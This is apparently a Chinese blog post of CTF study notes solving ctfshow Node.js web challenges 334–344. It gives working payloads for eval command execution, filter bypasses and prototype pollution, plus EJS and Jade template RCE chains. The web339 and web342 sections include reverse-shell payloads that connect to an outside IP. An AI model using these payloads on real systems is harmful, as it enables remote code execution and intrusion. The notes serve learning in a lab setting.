---
title: ctfshow-node.js
date: 2025-10-09 20:42:31
tags:
- node.js
category:
- 学习笔记
---

# ctfshow-node.js

## web334-大小写特性绕过

下载附件，有两个文件,user.js/login.js

nodejs大小写特性

在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。
在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。

---

login.js

```
var express = require('express');
var router = express.Router();
var users = require('../modules/user').items;
 
var findUser = function(name, password){
  return users.find(function(item){
    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
  });
};

/* GET home page. */
router.post('/', function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var sess = req.session;
  var user = findUser(req.body.username, req.body.password);
 
  if(user){
    req.session.regenerate(function(err) {
      if(err){
        return res.json({ret_code: 2, ret_msg: '登录失败'});        
      }
       
      req.session.loginUser = user.username;
      res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});              
    });
  }else{
    res.json({ret_code: 1, ret_msg: '账号或密码错误'});
  }  
  
});

module.exports = router;

```

---

user.js

```
module.exports = {
  items: [
    {username: 'CTFSHOW', password: '123456'}
  ]
};
```

这里的name.toUpperCase()会对name字符串进行大写转换

```
var findUser = function(name, password){
  return users.find(function(item){
    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
  });
};
```

使用js大小写的特性

**payload：**

```
username=ctfſhow&password=123456
```

---

## web335-exec命令执行

查看网页源码发现提示

```
<!-- /?eval= -->
```

猜测是使用eval函数进行命令执行

利用`child_process`的exec来执行系统命令。

payload：

```
?eval=require('child_process').execSync('ls')
```

回显

```
where is flag? app.js bin fl00g.txt modules node_modules package-lock.json package.json public routes sessions views
```

读取flag

```
?eval=require('child_process').execSync('cat fl00g.txt')
```

---

## web336-exec|load过滤绕过

### 解法一：绕过exec|load过滤

```
__filename
__dirname
```

`__filename`:返回当前模块文件被解析过后的**绝对路径**,
 使用`__filename`变量获取当前模块文件的**带有完整绝对路径**的文件名
 `__dirname`:返回**当前模块文件解析过后所在的文件夹(目录)的绝对路径**
 使用`__dirname`变量获得当前文件所在目录的**完整目录名**

利用`__filename`来获得当然的模块文件路径：

```
?eval=__filename

#/app/routes/index.js
```

然后读取文件

```
/?eval=require('fs').readFileSync('/app/routes/index.js','utf-8')


#where is flag? var express = require('express'); var router = express.Router(); /* GET home page. */ router.get('/', function(req, res, next) { res.type('html'); var evalstring = req.query.eval; if(typeof(evalstring)=='string' && evalstring.search(/exec|load/i)>0){ res.render('index',{ title: 'tql'}); }else{ res.render('index', { title: eval(evalstring) }); } }); module.exports = router;
```

可以看到这里过滤了exec和load

绕过exec|load过滤

**使用spawnSync命令执行**

```
?eval=require( 'child_process' ).spawnSync( 'ls' ).stdout.toString()
```

**利用＋号绕过命令执行**

```
?eval=require('child_process')['exe'%2B'cSync']('ls')

#app.js bin fl001g.txt modules node_modules package-lock.json package.json public routes sessions views
```

读取flag

```
?eval=require( 'child_process' ).spawnSync( 'cat', [ 'fl001g.txt' ] ).stdout.toString()

?eval=require('child_process')['exe'%2B'cSync']('cat fl001g.txt')
```

### 解法二：利用fs模块读取目录文件名/文件

```
?eval=require('fs').readdirSync('.')
?eval=require('fs').readFileSync('fl001g.txt','utf-8')

#app.js,bin,fl001g.txt,modules,node_modules,package-lock.json,package.json,public,routes,sessions,views
```

---

## web-337-nodejs弱类型比较与拼接问题

源码：

```
var express = require('express');
var router = express.Router();

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var flag='xxxxxxx';
  var a = req.query.a;
  var b = req.query.b;
  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);
  }else{
  	res.render('index',{ msg: 'tql'});
  }
  
});

module.exports = router;


```

绕过弱类型比较

```
if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);
}else{
 res.render('index',{ msg: 'tql'});
}
```

node.js中的拼接问题：

```
console.log(5+[6,6]); //56,6
console.log("5"+6); //56
console.log("5"+[6,6]); //56,6
console.log("5"+["6","6"]); //56,6
```

payload：

```
?a[]=1&b=1
?a[]=1&b[]=1
?a[]=a&b=a
```

---

## web338-原型链污染

源码：

```
var express = require('express');
var router = express.Router();
var utils = require('../utils/common');
 
 
 
/* GET home page.  */
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body);
  if(secert.ctfshow==='36dboy'){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
  }
  
  
});
 
module.exports = router;
```

只要满足这个条件即可输出flag

secert.ctfshow==='36dboy'

主要是`utils.copy(user,req.body);`是利用点

```
var utils = require('../utils/common');
```

utils是引入的common.js文件

我们根据这个找到common.js

```
module.exports = {
  copy:copy
};
 
function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }
```

因为原型污染，`secret`对象直接继承了Object.prototype，所以就导致了`secert.ctfshow==='36dboy'`

payload：

```
{"__proto__":{"ctfshow":"36dboy"}}
```

---

## web339-原型链污染+Function命令执行（变量覆盖）

api.js

```
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  res.render('api', { query: Function(query)(query)});
});
```

这里的Function(query)(query)可以执行query对应的指令，我们可以使用变量覆盖，将query的值作为反弹shell的点。

先抓包访问/login，实现query值的覆盖，再访问/api来执行query的值。

刷新了靶机，再用反弹shell的值覆盖：

```
{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >& /dev/tcp/121.43.154.98/9001 0>&1\"')"}}
```

------

没有vps就用execSync回显 

```
{"proto":{ "query":"return global.process.mainModule.constructor._load('child_process').execSync('cat /app/routes/login.js')"}}
```

---

## web340-proto嵌套

login.js部分代码：

```
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var user = new function(){
    this.userinfo = new function(){
    this.isVIP = false;
    this.isAdmin = false;
    this.isAuthor = false;     
    };
  }
  utils.copy(user.userinfo,req.body);
  if(user.userinfo.isAdmin){
   res.end(flag);
  }else{
   return res.json({ret_code: 2, ret_msg: '登录失败'});  
  }
```

user对象套了两层，本地测试一下

```
function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
}

var user = new function(){
    this.userinfo = new function(){
        this.isVIP = false;
        this.isAdmin = false;
        this.isAuthor = false;
    };
}

payload = JSON.parse('{"__proto__":{"__proto__":{"query":true}}}')
copy(user.userinfo,payload)

console.log('payload:')
console.log(payload) // { ['__proto__']: { ['__proto__']: { query: true } } }

console.log('Object:')
console.log(user.query) // true
console.log(user.userinfo.query) // true
```

可以看到，当我们嵌套两层__proto__时，不管是user对象还是user.userinfo对象都存在query属性，并成功被赋值。

而如果我们将payload改为： 不进行嵌套

```
JSON.parse('{"__proto__":{"query":true}}')
```

再运行代码会发现user.userinfo.query属性存在，但user.query为undefined。

所以payload：

```
{"proto":{"proto":{"query":"return global.process.mainModule.constructor._load('child_process').execSync('cat /app/routes/login.js')"}}}
```

---

## web341-ejs模版命令注入

js里的各种模板命令注入 参考：

https://xz.aliyun.com/news/6621

```
{"__proto__":{"__proto__":{"outputFunctionName":"a;return global.process.mainModule.require('child_process').execSync('cat /flag');//"}}}
```

EJS 在编译模板时会使用 `outputFunctionName` 来生成渲染函数：

```
// EJS 内部代码类似
var fn = new Function('locals, filters, escapeFn, include, rethrow', 
  'var __output = "";' + 
  'function ' + outputFunctionName + '() { /* 模板代码 */ }'
);
```

污染后的 `outputFunctionName` 包含恶意代码：

```
a;return global.process.mainModule.require('child_process').execSync('cat /flag');//
```

这会在 EJS 编译时被执行，实现 RCE。

---

## web342-jade模版命令注入

这次模板引擎改为了jade。

我们使用jade rce链构造payload：

```
{"__proto__":{"__proto__":{"type":"Block","nodes":"","compileDebug":1,"self":1,"line":"global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >& /dev/tcp/121.43.154.98/9001 0>&1\"')"}}}
```

```
# post 请求 /login
# 添加请求头 Content-Type: application/json
# 携带请求体
{
  "__proto__": {
    "__proto__": {
      "type": "Code",
      "self": 1,
      "line": "global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/x.x.x.x/x 0>&1\"')"
    }
  }
}
# 再访问 /
# flag 在 env 中
```

---

## web343-同342

同web342

---

## web344-逗号过滤绕过

源码：

```
router.get('/', function(req, res, next) {
 res.type('html');
 var flag = 'flag_here';
 if(req.url.match(/8c|2c|\,/ig)){
 	res.end('where is flag :)');
 }
 var query = JSON.parse(req.query.query);
 if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
 	res.end(flag);
 }else{
 	res.end('where is flag. :)');
 }

});
```

根据源码我们正常情况下需要传`?query={"name":"admin","password":"ctfshow","isVIP":true}`

但是题目把逗号和他的url编码给过滤掉了，所以需要绕过。

payload:

```
原payload：
?query={"name":"admin"&query="password":"ctfshow"&query="isVIP":true}

特殊编码：
?query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}
```

“&”连接三个属性，NodeJS会自动拼接：

为什么把ctfshow中的c编码呢，因为双引号的url编码是%22再和c连接起来就是%22c，会匹配到正则表达式。

这样也行

```
?query=%7b%22%6e%61%6d%65%22%3a%22%61%64%6d%69%6e%22&query=%22%70%61%73%73%77%6f%72%64%22%3a%22%63%74%66%73%68%6f%77%22&query=%22%69%73%56%49%50%22%3a%74%72%75%65%7d
```















